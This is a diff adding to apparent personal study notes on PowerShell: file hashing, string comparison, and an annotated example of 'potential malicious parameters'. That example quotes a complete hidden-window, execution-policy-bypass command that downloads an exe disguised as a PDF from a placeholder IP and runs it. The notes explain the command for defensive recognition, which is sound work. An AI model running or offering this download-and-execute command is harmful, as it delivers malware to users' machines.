@@ -186,6 +186,31 @@ What is PowerShell?
 		- Could write a script that loops between two ranges and prints out the results from above, or adds the findings to a list
 		- Test and see what is output'd from the above and see how to pull that into a separate txt file or something
 
+- Checking the hash of a file
+	- `CertUtil -hashfile <file-name> SHA256`
+- Comparing two strings together:
+	- `<"string-1">.Equals("string-2")`
+		- Will return a boolean value
+
+- Potential Malicious Parameters
+	```powershell
+	"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://<pubic-ip-address>/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
+	```
+	- `-WindowStyle`
+		- This parameter allows one to control how the PowerShell window appears when executing a script or command
+		- `-WindowStyle hidden`
+			- Will mean that the PowerShell window will not be visible to the user of the machine where the command is running from.
+	- `-executionpolicy bypass`
+		- Means that the execution policy (which allows one to override this policy) is ignored, allowing any script to run without restriction
+	- `Invoke-WebRequest`
+		- Commonly used for downloading files from the Internet
+	- `Uri`
+		- Specifies the URL of the web resource one is wanting to retrieve
+	- `-OutFile`
+		- Specifies the local file where the downloaded content will be saved (here it will be saved to $TempFile)
+	- `Start-Process`
+		- Executes the downloaded file that is stored in `$TempFile`
+	
 - Basic Scripting
 	- Scripting would allow for the automation of various tasks, essentially allowing for efficiency
 	- Log analysis, anomaly detection, pulling Indicators of Compromise (IoCs)
